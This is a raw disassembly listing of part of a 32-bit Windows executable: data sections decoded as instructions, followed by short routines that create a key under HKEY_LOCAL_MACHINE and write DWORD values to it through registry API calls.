  4016e4:	add    BYTE PTR gs:0x6f004c00,ch
  4016eb:	add    BYTE PTR [ebx+0x0],ah
  4016ee:	popa   
  4016ef:	add    BYTE PTR [eax+eax*1+0x52],ch
  4016f3:	add    BYTE PTR [ebp+0x0],ah
  4016f6:	add    BYTE PTR [bx+di+0x0],ch
  4016fa:	jae    0x4016fc
  4016fc:	je     0x4016fe
  4016fe:	jb     0x401700
  401700:	jns    0x401702
  401702:	sub    eax,0x31004c00
  401707:	add    BYTE PTR ds:0x2d003100,ch
  40170d:	add    BYTE PTR [eax],dh
  40170f:	add    BYTE PTR [esi],ch
  401711:	add    BYTE PTR [eax+eax*1+0x6c],ah
  401715:	add    BYTE PTR [eax+eax*1+0x0],ch
  401719:	add    BYTE PTR [eax],al
  40171b:	add    BYTE PTR [edx+0x65],dl
  40171e:	addr16 inc esp
  401720:	gs ins BYTE PTR es:[edi],dx
  401722:	gs je  0x40178a
  401725:	dec    ebx
  401726:	gs jns 0x40176e
  401729:	js     0x401782
  40172b:	add    BYTE PTR [ecx+0x0],ah
  40172e:	add    BYTE PTR fs:[esi+0x0],dh
  401732:	popa   
  401733:	add    BYTE PTR [eax+0x0],dh
  401736:	imul   eax,DWORD PTR [eax],0x320033
  40173c:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  401741:	add    BYTE PTR [eax+eax*1+0x0],ch
  401745:	add    BYTE PTR [eax],al
  401747:	add    BYTE PTR [edx+0x65],dl
  40174a:	addr16 inc esp
  40174c:	gs ins BYTE PTR es:[edi],dx
  40174e:	gs je  0x4017b6
  401751:	dec    ebx
  401752:	gs jns 0x4017ac
  401755:	add    BYTE PTR [eax],al
  401757:	add    BYTE PTR [ebx+0x0],bh
  40175a:	inc    ebx
  40175b:	add    BYTE PTR [ebx],dh
  40175d:	add    BYTE PTR [ecx+0x0],al
  401760:	xor    eax,DWORD PTR [eax]
  401762:	xor    al,0x0
  401764:	xor    eax,DWORD PTR [eax]
  401766:	xor    eax,0x2d003400
  40176b:	add    BYTE PTR [esi],dh
  40176d:	add    BYTE PTR [esi],dh
  40176f:	add    BYTE PTR [eax],dh
  401771:	add    BYTE PTR [esi+0x0],al
  401774:	sub    eax,0x31003400
  401779:	add    BYTE PTR [ebp+0x0],al
  40177c:	inc    ebp
  40177d:	add    BYTE PTR ds:0x30004200,ch
  401783:	add    BYTE PTR [edi],dh
  401785:	add    BYTE PTR [edx],dh
  401787:	add    BYTE PTR ds:0x41003200,ch
  40178d:	add    BYTE PTR [ebp+0x0],al
  401790:	inc    ecx
  401791:	add    BYTE PTR ds:0x33004500,dh
  401797:	add    BYTE PTR [ecx+0x0],al
  40179a:	cmp    BYTE PTR [eax],al
  40179c:	xor    BYTE PTR [eax],al
  40179e:	inc    ecx
  40179f:	add    BYTE PTR [esi+0x0],al
  4017a2:	jge    0x4017a4
  4017a4:	add    BYTE PTR [eax],al
  4017a6:	add    BYTE PTR [eax],al
  4017a8:	dec    ebp
  4017a9:	add    BYTE PTR [ebx+0x0],dh
  4017ac:	arpl   WORD PTR [eax],ax
  4017ae:	outs   dx,DWORD PTR ds:[esi]
  4017af:	add    BYTE PTR [edx+0x0],dh
  4017b2:	add    BYTE PTR gs:[ebp+0x0],ah
  4017b6:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  4017bb:	add    BYTE PTR [eax+eax*1+0x0],ch
  4017bf:	add    BYTE PTR ds:0x2f00,ch
  4017c5:	add    BYTE PTR [eax],al
  4017c7:	add    BYTE PTR [ebp+0x0],dl
  4017ca:	outs   dx,BYTE PTR ds:[esi]
  4017cb:	add    BYTE PTR [edx+0x0],dh
  4017ce:	add    BYTE PTR gs:[edi+0x0],ah
  4017d2:	push   ebx
  4017d3:	add    BYTE PTR [ebp+0x0],ah
  4017d6:	jb     0x4017d8
  4017d8:	jbe    0x4017da
  4017da:	add    BYTE PTR gs:[edx+0x0],dh
  4017de:	add    BYTE PTR [eax],al
  4017e0:	push   edx
  4017e1:	add    BYTE PTR [ebp+0x0],ah
  4017e4:	add    BYTE PTR [bp+di+0x0],dl
  4017e8:	add    BYTE PTR gs:[edx+0x0],dh
  4017ec:	jbe    0x4017ee
  4017ee:	add    BYTE PTR gs:[edx+0x0],dh
  4017f2:	add    BYTE PTR [eax],al
  4017f4:	inc    esi
  4017f5:	add    DWORD PTR [eax],eax
  4017f7:	add    BYTE PTR [eax],al
  4017f9:	add    BYTE PTR [eax],al
  4017fb:	add    al,al
  4017fd:	add    BYTE PTR [eax],al
  4017ff:	add    BYTE PTR [eax],al
  401801:	add    BYTE PTR [eax],al
  401803:	inc    esi
  401804:	adc    ah,al
  401806:	add    al,BYTE PTR [eax]
  401808:	add    BYTE PTR [eax],al
  40180a:	add    BYTE PTR [eax],al
  40180c:	rol    BYTE PTR [eax],0x0
  40180f:	add    BYTE PTR [eax],al
  401811:	add    BYTE PTR [eax],al
  401813:	inc    esi
  401814:	pop    esp
  401815:	add    BYTE PTR [edx+0x0],dl
  401818:	add    BYTE PTR gs:[ecx+0x0],dh
  40181c:	jne    0x40181e
  40181e:	imul   eax,DWORD PTR [eax],0x650072
  401824:	add    BYTE PTR fs:[eax],ah
  401827:	add    BYTE PTR [ebx+0x0],al
  40182a:	popa   
  40182b:	add    BYTE PTR [eax+eax*1+0x65],dh
  40182f:	add    BYTE PTR [edi+0x0],ah
  401832:	outs   dx,DWORD PTR ds:[esi]
  401833:	add    BYTE PTR [edx+0x0],dh
  401836:	imul   eax,DWORD PTR [eax],0x730065
  40183c:	add    BYTE PTR [eax],al
  40183e:	add    BYTE PTR [eax],al
  401840:	inc    ebx
  401841:	add    BYTE PTR [eax+eax*1+0x53],cl
  401845:	add    BYTE PTR [ecx+0x0],cl
  401848:	inc    esp
  401849:	add    BYTE PTR [eax+eax*1+0x0],bl
  40184d:	add    BYTE PTR [eax],al
  40184f:	add    BYTE PTR [eax+eax*1+0x49],bl
  401853:	add    BYTE PTR [ebp+0x0],ch
  401856:	jo     0x401858
  401858:	ins    BYTE PTR es:[edi],dx
  401859:	add    BYTE PTR [ebp+0x0],ah
  40185c:	ins    DWORD PTR es:[edi],dx
  40185d:	add    BYTE PTR [ebp+0x0],ah
  401860:	outs   dx,BYTE PTR ds:[esi]
  401861:	add    BYTE PTR [eax+eax*1+0x65],dh
  401865:	add    BYTE PTR [eax+eax*1+0x20],ah
  401869:	add    BYTE PTR [ebx+0x0],al
  40186c:	popa   
  40186d:	add    BYTE PTR [eax+eax*1+0x65],dh
  401871:	add    BYTE PTR [edi+0x0],ah
  401874:	outs   dx,DWORD PTR ds:[esi]
  401875:	add    BYTE PTR [edx+0x0],dh
  401878:	imul   eax,DWORD PTR [eax],0x730065
  40187e:	add    BYTE PTR [eax],al
  401880:	add    BYTE PTR cs:[eax+eax*1+0x6c],dh
  401885:	add    BYTE PTR [edx+0x0],ah
  401888:	add    BYTE PTR [eax],al
  40188a:	add    BYTE PTR [eax],al
  40188c:	inc    ecx
  40188d:	add    BYTE PTR [eax+0x0],dl
  401890:	push   eax
  401891:	add    BYTE PTR [ecx+0x0],cl
  401894:	inc    esp
  401895:	add    BYTE PTR [eax],al
  401897:	add    al,ah
  401899:	cmp    eax,0x3c6f394c
  40189e:	rcl    BYTE PTR [ecx],cl
  4018a0:	cmp    DWORD PTR [ebx+0x0],0x7a794fc0
  4018a7:	mov    bh,0x5
  4018a9:	loopne 0x4018ad
  4018ab:	add    BYTE PTR [eax],al
  4018ad:	add    BYTE PTR [eax],al
  4018af:	add    al,al
  4018b1:	add    BYTE PTR [eax],al
  4018b3:	add    BYTE PTR [eax],al
  4018b5:	add    BYTE PTR [eax],al
  4018b7:	inc    esi
	...
  4018d4:	xor    edi,DWORD PTR [edi+ebx*4]
  4018d7:	push   ebp
  4018d8:	add    BYTE PTR [eax],al
  4018da:	add    BYTE PTR [eax],al
  4018dc:	add    al,BYTE PTR [eax]
  4018de:	add    BYTE PTR [eax],al
  4018e0:	add    BYTE PTR es:[eax],al
  4018e3:	add    BYTE PTR [ecx+ebx*1+0xd940000],dl
  4018ea:	add    BYTE PTR [eax],al
  4018ec:	add    BYTE PTR [eax],al
  4018ee:	add    BYTE PTR [eax],al
  4018f0:	xor    edi,DWORD PTR [edi+ebx*4]
  4018f3:	push   ebp
  4018f4:	add    BYTE PTR [eax],al
  4018f6:	add    BYTE PTR [eax],al
  4018f8:	or     eax,0x48000000
  4018fd:	add    al,BYTE PTR [eax]
  4018ff:	add    al,dl
  401901:	sbb    DWORD PTR [eax],eax
  401903:	add    al,dl
  401905:	or     eax,0x0
	...
  401926:	add    BYTE PTR [eax],al
  401928:	push   0x0
	...
  401961:	add    BYTE PTR [eax],al
  401963:	add    BYTE PTR [eax],cl
  401965:	jo     0x4019a7
  401967:	add    BYTE PTR [eax+0x1004019],dl
  40196d:	add    BYTE PTR [eax],al
  40196f:	add    BYTE PTR [eax+0x4081],ah
  401975:	add    BYTE PTR [eax],al
  401977:	add    BYTE PTR [eax+edx*1],ch
  40197a:	inc    eax
  40197b:	add    BYTE PTR [ebx],bh
  40197d:	add    BYTE PTR [eax],al
  40197f:	add    BYTE PTR [eax],al
  401981:	xor    eax,0x0
	...
  40198e:	add    BYTE PTR [eax],al
  401990:	push   eax
  401991:	push   0x0
  401993:	add    BYTE PTR [edx+0x53],dl
  401996:	inc    esp
  401997:	push   ebx
  401998:	sub    al,0xe5
  40199a:	adc    DWORD PTR cs:[edx-0x6aba7ebf],edi
  4019a1:	(bad)  
  4019a2:	sub    eax,0x8a4be6e7
  4019a7:	add    DWORD PTR [bx+si],eax
  4019aa:	add    BYTE PTR [eax],al
  4019ac:	arpl   WORD PTR [esp+esi*2+0x75],si
  4019b0:	outs   dx,BYTE PTR ds:[esi]
  4019b1:	gs jae 0x401a2a
  4019b4:	jb     0x4019e4
  4019b6:	jo     0x401a1c
  4019b8:	bound  eax,QWORD PTR [eax]
	...
  4019ce:	add    BYTE PTR [eax],al
  4019d0:	inc    edi
  4019d1:	inc    ebx
  4019d2:	push   esp
  4019d3:	dec    esp
  4019d4:	add    BYTE PTR [eax],dl
  4019d6:	add    BYTE PTR [eax],al
  4019d8:	add    al,0x0
  4019da:	add    BYTE PTR [eax],al
  4019dc:	cs inc ebx
  4019de:	push   edx
  4019df:	push   esp
  4019e0:	and    al,0x58
  4019e2:	inc    ebx
  4019e3:	inc    ecx
  4019e4:	add    BYTE PTR [eax],al
  4019e6:	add    BYTE PTR [eax],al
  4019e8:	add    al,0x10
  4019ea:	add    BYTE PTR [eax],al
  4019ec:	add    al,0x0
  4019ee:	add    BYTE PTR [eax],al
  4019f0:	cs inc ebx
  4019f2:	push   edx
  4019f3:	push   esp
  4019f4:	and    al,0x58
  4019f6:	inc    ebx
  4019f7:	inc    ecx
  4019f8:	inc    ecx
  4019f9:	add    BYTE PTR [eax],al
  4019fb:	add    BYTE PTR [eax],cl
  4019fd:	adc    BYTE PTR [eax],al
  4019ff:	add    BYTE PTR [eax+eax*1],cl
  401a02:	add    BYTE PTR [eax],al
  401a04:	cs inc ebx
  401a06:	push   edx
  401a07:	push   esp
  401a08:	and    al,0x58
  401a0a:	inc    ebx
  401a0b:	dec    esp
  401a0c:	add    BYTE PTR [eax],al
  401a0e:	add    BYTE PTR [eax],al
  401a10:	adc    al,0x10
  401a12:	add    BYTE PTR [eax],al
  401a14:	add    al,0x0
  401a16:	add    BYTE PTR [eax],al
  401a18:	cs inc ebx
  401a1a:	push   edx
  401a1b:	push   esp
  401a1c:	and    al,0x58
  401a1e:	inc    ebx
  401a1f:	push   ebp
  401a20:	add    BYTE PTR [eax],al
  401a22:	add    BYTE PTR [eax],al
  401a24:	sbb    BYTE PTR [eax],dl
  401a26:	add    BYTE PTR [eax],al
  401a28:	add    al,0x0
  401a2a:	add    BYTE PTR [eax],al
  401a2c:	cs inc ebx
  401a2e:	push   edx
  401a2f:	push   esp
  401a30:	and    al,0x58
  401a32:	inc    ebx
  401a33:	pop    edx
  401a34:	add    BYTE PTR [eax],al
  401a36:	add    BYTE PTR [eax],al
  401a38:	sbb    al,0x10
  401a3a:	add    BYTE PTR [eax],al
  401a3c:	add    al,0x0
  401a3e:	add    BYTE PTR [eax],al
  401a40:	cs inc ebx
  401a42:	push   edx
  401a43:	push   esp
  401a44:	and    al,0x58
  401a46:	dec    ecx
  401a47:	inc    ecx
  401a48:	add    BYTE PTR [eax],al
  401a4a:	add    BYTE PTR [eax],al
  401a4c:	and    BYTE PTR [eax],dl
  401a4e:	add    BYTE PTR [eax],al
  401a50:	add    al,0x0
  401a52:	add    BYTE PTR [eax],al
  401a54:	cs inc ebx
  401a56:	push   edx
  401a57:	push   esp
  401a58:	and    al,0x58
  401a5a:	dec    ecx
  401a5b:	inc    ecx
  401a5c:	inc    ecx
  401a5d:	add    BYTE PTR [eax],al
  401a5f:	add    BYTE PTR [eax+edx*1],ah
  401a62:	add    BYTE PTR [eax],al
  401a64:	add    al,0x0
  401a66:	add    BYTE PTR [eax],al
  401a68:	cs inc ebx
  401a6a:	push   edx
  401a6b:	push   esp
  401a6c:	and    al,0x58
  401a6e:	dec    ecx
  401a6f:	pop    ecx
  401a70:	add    BYTE PTR [eax],al
  401a72:	add    BYTE PTR [eax],al
  401a74:	sub    BYTE PTR [eax],dl
  401a76:	add    BYTE PTR [eax],al
  401a78:	add    al,0x0
  401a7a:	add    BYTE PTR [eax],al
  401a7c:	cs inc ebx
  401a7e:	push   edx
  401a7f:	push   esp
  401a80:	and    al,0x58
  401a82:	dec    ecx
  401a83:	pop    edx
  401a84:	add    BYTE PTR [eax],al
  401a86:	add    BYTE PTR [eax],al
  401a88:	sub    al,0x10
  401a8a:	add    BYTE PTR [eax],al
  401a8c:	in     al,dx
  401a8d:	add    BYTE PTR [eax],al
  401a8f:	add    BYTE PTR [esi],ch
  401a91:	imul   sp,WORD PTR [si+0x73],0x7824
  401a98:	add    BYTE PTR [eax],al
  401a9a:	add    BYTE PTR [eax],al
  401a9c:	and    BYTE PTR [ecx],dl
  401a9e:	add    BYTE PTR [eax],al
  401aa0:	jo     0x401aaa
  401aa2:	add    BYTE PTR [eax],al
  401aa4:	cs jb  0x401b0b
  401aa7:	popa   
  401aa8:	je     0x401b0b
  401aaa:	add    BYTE PTR [eax],al
  401aac:	nop
  401aad:	sbb    DWORD PTR [eax],eax
  401aaf:	add    BYTE PTR [eax+eax*1],al
  401ab2:	add    BYTE PTR [eax],al
  401ab4:	cs jb  0x401b1b
  401ab7:	popa   
  401ab8:	je     0x401b1b
  401aba:	and    al,0x73
  401abc:	js     0x401b22
  401abe:	popa   
  401abf:	je     0x401b22
  401ac1:	add    BYTE PTR [eax],al
  401ac3:	add    BYTE PTR [ecx+ebx*1+0x2840000],dl
  401aca:	add    BYTE PTR [eax],al
  401acc:	cs jb  0x401b33
  401acf:	popa   
  401ad0:	je     0x401b33
  401ad2:	and    al,0x7a
  401ad4:	jp     0x401b50
  401ad6:	bound  esp,QWORD PTR fs:[edi+0x0]
  401ada:	add    BYTE PTR [eax],al
  401adc:	sbb    BYTE PTR [eax+eax*1],bl
  401adf:	add    BYTE PTR [ebp+0x2e000000],ah
  401ae5:	je     0x401b4c
  401ae7:	js     0x401b5d
  401ae9:	and    al,0x64
  401aeb:	imul   eax,DWORD PTR [eax],0xc0000000
  401af1:	sbb    al,0x0
  401af3:	add    BYTE PTR [esi+0x4f],ah
  401af6:	add    BYTE PTR [eax],al
  401af8:	cs je  0x401b60
  401afb:	js     0x401b71
  401afd:	and    al,0x6d
  401aff:	outs   dx,BYTE PTR ds:[esi]
  401b00:	add    BYTE PTR [eax],al
  401b02:	add    BYTE PTR [eax],al
  401b04:	es ins BYTE PTR es:[edi],dx
  401b06:	add    BYTE PTR [eax],al
  401b08:	pop    edi
  401b09:	add    BYTE PTR [eax],al
  401b0b:	add    BYTE PTR [esi],ch
  401b0d:	je     0x401b74
  401b0f:	js     0x401b85
  401b11:	and    al,0x79
  401b13:	add    BYTE PTR fs:[eax],al
  401b16:	add    BYTE PTR [eax],al
  401b18:	mov    BYTE PTR [eax+eax*1+0x0],ch
  401b1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b1d:	add    BYTE PTR [eax],al
  401b1f:	add    BYTE PTR [esi],ch
  401b21:	js     0x401b87
  401b23:	popa   
  401b24:	je     0x401b87
  401b26:	and    al,0x78
  401b28:	add    BYTE PTR [eax],al
  401b2a:	add    BYTE PTR [eax],al
  401b2c:	sub    al,0x6d
  401b2e:	add    BYTE PTR [eax],al
  401b30:	add    al,0x0
  401b32:	add    BYTE PTR [eax],al
  401b34:	inc    ecx
  401b35:	push   esp
  401b36:	dec    esp
  401b37:	and    al,0x5f
  401b39:	pop    edi
  401b3a:	popa   
  401b3b:	add    BYTE PTR [eax],dh
  401b3d:	ins    DWORD PTR es:[edi],dx
  401b3e:	add    BYTE PTR [eax],al
  401b40:	add    al,0x0
  401b42:	add    BYTE PTR [eax],al
  401b44:	inc    ecx
  401b45:	push   esp
  401b46:	dec    esp
  401b47:	and    al,0x5f
  401b49:	pop    edi
  401b4a:	ins    DWORD PTR es:[edi],dx
  401b4b:	add    BYTE PTR [ebp*2+0x40000],dh
  401b52:	add    BYTE PTR [eax],al
  401b54:	inc    ecx
  401b55:	push   esp
  401b56:	dec    esp
  401b57:	and    al,0x5f
  401b59:	pop    edi
  401b5a:	jp     0x401b5c
  401b5c:	add    BYTE PTR [eax+0x0],dh
  401b5f:	add    BYTE PTR [eax+0x2e000000],dh
  401b65:	fs popa 
  401b67:	je     0x401bca
  401b69:	add    BYTE PTR [eax],al
  401b6b:	add    BYTE PTR [eax+0x28000070],dh
  401b71:	add    al,0x0
  401b73:	add    BYTE PTR [esi],ch
  401b75:	bound  esi,QWORD PTR [ebx+0x73]
  401b78:	add    BYTE PTR [eax],al
  401b7a:	add    BYTE PTR [eax],al
  401b7c:	add    BYTE PTR [eax+0x1a00000],al
  401b82:	add    BYTE PTR [eax],al
  401b84:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x352461
  401b8d:	add    BYTE PTR [eax],al
  401b8f:	add    BYTE PTR [eax+0x4000081],ah
  401b95:	add    BYTE PTR [eax],al
  401b97:	add    BYTE PTR [esi],ch
  401b99:	xor    BYTE PTR [eax],dh
  401b9b:	arpl   WORD PTR [esi+0x67],sp
  401b9e:	add    BYTE PTR [eax],al
  401ba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ba1:	add    DWORD PTR [eax],0x7800
  401ba7:	add    BYTE PTR [esi],ch
  401ba9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x322461
  401bb1:	add    BYTE PTR [eax],al
  401bb3:	add    BYTE PTR [edx+eax*4],bl
  401bb6:	add    BYTE PTR [eax],al
  401bb8:	adc    al,0x0
  401bba:	add    BYTE PTR [eax],al
  401bbc:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x332461
  401bc5:	add    BYTE PTR [eax],al
  401bc7:	add    BYTE PTR [eax],dh
  401bc9:	add    BYTE PTR [eax],0x0
  401bcc:	mov    al,ds:0x2e000001
  401bd1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x342461
  401bd9:	add    BYTE PTR [eax],al
  401bdb:	add    al,dl
  401bdd:	add    DWORD PTR [eax],0x0
  401be0:	ss push es
  401be2:	add    BYTE PTR [eax],al
  401be4:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x362461
  401bed:	add    BYTE PTR [eax],al
  401bef:	add    BYTE PTR [eax],al
  401bf1:	nop
  401bf2:	add    BYTE PTR [eax],al
  401bf4:	aam    0x1
  401bf6:	add    BYTE PTR [eax],al
  401bf8:	cs jb  0x401c6e
  401bfb:	jb     0x401c60
  401bfd:	and    al,0x30
  401bff:	xor    DWORD PTR [eax],eax
  401c01:	add    BYTE PTR [eax],al
  401c03:	add    al,ah
  401c05:	xchg   ecx,eax
  401c06:	add    BYTE PTR [eax],al
  401c08:	pop    eax
  401c09:	pop    ss
  401c0a:	add    BYTE PTR [eax],al
  401c0c:	cs jb  0x401c82
  401c0f:	jb     0x401c74
  401c11:	and    al,0x30
  401c13:	xor    al,BYTE PTR [eax]
	...
  401c1d:	add    BYTE PTR [eax],al
  401c1f:	add    al,ch
  401c21:	mov    bl,0x31
  401c23:	add    BYTE PTR [eax],al
  401c25:	push   0x406c30
  401c2a:	mov    DWORD PTR ds:0x407448,0x401370
  401c34:	call   0x406669
  401c39:	pop    ecx
  401c3a:	ret    
  401c3b:	int3   
  401c3c:	int3   
  401c3d:	int3   
  401c3e:	int3   
  401c3f:	int3   
  401c40:	call   0x405e22
  401c45:	push   0x406c40
  401c4a:	call   0x406669
  401c4f:	pop    ecx
  401c50:	ret    
  401c51:	int3   
  401c52:	int3   
  401c53:	int3   
  401c54:	int3   
  401c55:	int3   
  401c56:	int3   
  401c57:	int3   
  401c58:	int3   
  401c59:	int3   
  401c5a:	int3   
  401c5b:	int3   
  401c5c:	int3   
  401c5d:	int3   
  401c5e:	int3   
  401c5f:	int3   
  401c60:	mov    ecx,0x407054
  401c65:	call   0x4028dd
  401c6a:	test   eax,eax
  401c6c:	jns    0x401c7c
  401c6e:	and    DWORD PTR ds:0x407050,0x0
  401c75:	mov    BYTE PTR ds:0x407400,0x1
  401c7c:	push   0x406c60
  401c81:	call   0x406669
  401c86:	pop    ecx
  401c87:	ret    
  401c88:	int3   
  401c89:	int3   
  401c8a:	int3   
  401c8b:	int3   
  401c8c:	int3   
  401c8d:	int3   
  401c8e:	int3   
  401c8f:	int3   
  401c90:	mov    ecx,0x40708c
  401c95:	call   0x4028dd
  401c9a:	test   eax,eax
  401c9c:	jns    0x401ca7
  401c9e:	mov    BYTE PTR ds:0x407400,0x1
  401ca5:	jmp    0x401cb1
  401ca7:	mov    DWORD PTR ds:0x40707c,0x28
  401cb1:	push   0x406c80
  401cb6:	call   0x406669
  401cbb:	pop    ecx
  401cbc:	ret    
  401cbd:	int3   
  401cbe:	int3   
  401cbf:	int3   
  401cc0:	int3   
  401cc1:	int3   
  401cc2:	int3   
  401cc3:	int3   
  401cc4:	int3   
  401cc5:	int3   
  401cc6:	int3   
  401cc7:	int3   
  401cc8:	int3   
  401cc9:	int3   
  401cca:	int3   
  401ccb:	int3   
  401ccc:	int3   
  401ccd:	int3   
  401cce:	int3   
  401ccf:	int3   
  401cd0:	mov    edi,edi
  401cd2:	push   ebp
  401cd3:	mov    ebp,esp
  401cd5:	push   0x0
  401cd7:	push   DWORD PTR [ebp+0x8]
  401cda:	push   0x66
  401cdc:	pop    edx
  401cdd:	call   0x404ada
  401ce2:	pop    ebp
  401ce3:	ret    0x4
  401ce6:	int3   
  401ce7:	int3   
  401ce8:	int3   
  401ce9:	int3   
  401cea:	int3   
  401ceb:	mov    edi,edi
  401ced:	push   ebp
  401cee:	mov    ebp,esp
  401cf0:	push   ecx
  401cf1:	push   esi
  401cf2:	lea    eax,[ebp-0x4]
  401cf5:	xor    esi,esi
  401cf7:	push   eax
  401cf8:	mov    DWORD PTR [ebp-0x4],esi
  401cfb:	call   DWORD PTR ds:0x408054
  401d01:	push   eax
  401d02:	call   DWORD PTR ds:0x408050
  401d08:	test   eax,eax
  401d0a:	je     0x401d12
  401d0c:	cmp    DWORD PTR [ebp-0x4],esi
  401d0f:	je     0x401d12
  401d11:	inc    esi
  401d12:	mov    eax,esi
  401d14:	pop    esi
  401d15:	mov    esp,ebp
  401d17:	pop    ebp
  401d18:	ret    
  401d19:	int3   
  401d1a:	int3   
  401d1b:	int3   
  401d1c:	int3   
  401d1d:	int3   
  401d1e:	mov    edi,edi
  401d20:	push   ebp
  401d21:	mov    ebp,esp
  401d23:	push   ecx
  401d24:	push   ecx
  401d25:	push   ebx
  401d26:	push   edi
  401d27:	lea    eax,[ebp-0x8]
  401d2a:	xor    ebx,ebx
  401d2c:	push   eax
  401d2d:	lea    eax,[ebp-0x4]
  401d30:	mov    DWORD PTR [ebp-0x4],ebx
  401d33:	push   eax
  401d34:	push   ebx
  401d35:	push   DWORD PTR [ebp+0x10]
  401d38:	mov    edi,ecx
  401d3a:	push   ebx
  401d3b:	push   ebx
  401d3c:	push   ebx
  401d3d:	push   0x4013a8
  401d42:	push   0x80000002
  401d47:	mov    BYTE PTR [edi],bl
  401d49:	call   DWORD PTR ds:0x408014
  401d4f:	test   eax,eax
  401d51:	jne    0x401d82
  401d53:	push   esi
  401d54:	lea    eax,[ebp-0x8]
  401d57:	push   eax
  401d58:	lea    eax,[edi+0x4]
  401d5b:	push   eax
  401d5c:	push   ebx
  401d5d:	push   DWORD PTR [ebp+0x10]
  401d60:	push   ebx
  401d61:	push   ebx
  401d62:	push   ebx
  401d63:	push   DWORD PTR [ebp+0xc]
  401d66:	push   DWORD PTR [ebp-0x4]
  401d69:	call   DWORD PTR ds:0x408014
  401d6f:	push   DWORD PTR [ebp-0x4]
  401d72:	mov    esi,eax
  401d74:	call   DWORD PTR ds:0x408000
  401d7a:	test   esi,esi
  401d7c:	pop    esi
  401d7d:	jne    0x401d82
  401d7f:	mov    BYTE PTR [edi],0x1
  401d82:	mov    eax,edi
  401d84:	pop    edi
  401d85:	pop    ebx
  401d86:	mov    esp,ebp
  401d88:	pop    ebp
  401d89:	ret    0xc
  401d8c:	int3   
  401d8d:	int3   
  401d8e:	int3   
  401d8f:	int3   
  401d90:	int3   
  401d91:	mov    edi,edi
  401d93:	push   esi
  401d94:	mov    esi,ecx
  401d96:	cmp    BYTE PTR [esi],0x0
  401d99:	je     0x401da7
  401d9b:	push   DWORD PTR [esi+0x4]
  401d9e:	call   DWORD PTR ds:0x408000
  401da4:	mov    BYTE PTR [esi],0x0
  401da7:	pop    esi
  401da8:	ret    
  401da9:	int3   
  401daa:	int3   
  401dab:	int3   
  401dac:	int3   
  401dad:	int3   
  401dae:	mov    edi,edi
  401db0:	push   ebp
  401db1:	mov    ebp,esp
  401db3:	push   ecx
  401db4:	push   ebx
  401db5:	xor    ebx,ebx
  401db7:	cmp    BYTE PTR [ecx],bl
  401db9:	je     0x401ddc
  401dbb:	mov    eax,DWORD PTR [ebp+0xc]
  401dbe:	push   0x4
  401dc0:	mov    DWORD PTR [ebp-0x4],eax
  401dc3:	lea    eax,[ebp-0x4]
  401dc6:	push   eax
  401dc7:	push   0x4
  401dc9:	push   ebx
  401dca:	push   DWORD PTR [ebp+0x8]
  401dcd:	push   DWORD PTR [ecx+0x4]
  401dd0:	call   DWORD PTR ds:0x408010
  401dd6:	test   eax,eax
  401dd8:	jne    0x401ddc
  401dda:	mov    bl,0x1
  401ddc:	mov    al,bl
  401dde:	pop    ebx
  401ddf:	mov    esp,ebp
  401de1:	pop    ebp
  401de2:	ret    0x8
  401de5:	int3   
  401de6:	int3   
  401de7:	int3   
  401de8:	int3   
  401de9:	int3   
  401dea:	int3   
  401deb:	int3   
  401dec:	int3   
  401ded:	int3   
  401dee:	int3   
  401def:	int3   
  401df0:	mov    edi,edi
  401df2:	push   ebp
  401df3:	mov    ebp,esp
  401df5:	sub    esp,0x10
  401df8:	push   esi
  401df9:	push   edi
  401dfa:	call   0x401ceb
  401dff:	test   eax,eax
  401e01:	je     0x401e98
  401e07:	push   0x2021f
  401e0c:	push   DWORD PTR [ebp+0xc]
  401e0f:	push   ecx
  401e10:	lea    ecx,[ebp-0x10]
  401e13:	call   0x401d1e
  401e18:	push   DWORD PTR [ebp+0x10]
  401e1b:	mov    edi,0x4013f0
  401e20:	lea    ecx,[ebp-0x10]
  401e23:	push   edi
  401e24:	call   0x401dae
  401e29:	test   al,al
  401e2b:	je     0x401e85
  401e2d:	push   DWORD PTR [ebp+0x14]
  401e30:	mov    esi,0x401410
  401e35:	lea    ecx,[ebp-0x10]
  401e38:	push   esi
  401e39:	call   0x401dae
  401e3e:	test   al,al
  401e40:	je     0x401e85
  401e42:	push   0x2011f
  401e47:	push   DWORD PTR [ebp+0xc]
  401e4a:	push   ecx
  401e4b:	lea    ecx,[ebp-0x8]
  401e4e:	call   0x401d1e
  401e53:	push   DWORD PTR [ebp+0x10]
  401e56:	lea    ecx,[ebp-0x8]
  401e59:	push   edi
  401e5a:	call   0x401dae
  401e5f:	test   al,al
  401e61:	je     0x401e7d
  401e63:	push   DWORD PTR [ebp+0x14]
  401e66:	lea    ecx,[ebp-0x8]
  401e69:	push   esi
  401e6a:	call   0x401dae
  401e6f:	test   al,al
  401e71:	je     0x401e7d
  401e73:	lea    ecx,[ebp-0x8]
  401e76:	call   0x401d91
  401e7b:	jmp    0x401ed1
  401e7d:	lea    ecx,[ebp-0x8]
  401e80:	call   0x401d91
  401e85:	lea    ecx,[ebp-0x10]
  401e88:	call   0x401d91
  401e8d:	xor    eax,eax
  401e8f:	inc    eax
  401e90:	pop    edi
  401e91:	pop    esi
  401e92:	mov    esp,ebp
  401e94:	pop    ebp
  401e95:	ret    0x10
  401e98:	push   0x2001f
  401e9d:	push   DWORD PTR [ebp+0xc]
  401ea0:	push   ecx
  401ea1:	lea    ecx,[ebp-0x10]
  401ea4:	call   0x401d1e
  401ea9:	push   DWORD PTR [ebp+0x10]
  401eac:	lea    ecx,[ebp-0x10]
  401eaf:	push   0x4013f0
  401eb4:	call   0x401dae
  401eb9:	test   al,al
  401ebb:	je     0x401e85
  401ebd:	push   DWORD PTR [ebp+0x14]
  401ec0:	lea    ecx,[ebp-0x10]
  401ec3:	push   0x401410
  401ec8:	call   0x401dae
  401ecd:	test   al,al
  401ecf:	je     0x401e85
  401ed1:	lea    ecx,[ebp-0x10]
  401ed4:	call   0x401d91
  401ed9:	xor    eax,eax
  401edb:	jmp    0x401e90
  401edd:	int3   
  401ede:	int3   
  401edf:	int3   
  401ee0:	int3   
  401ee1:	int3   
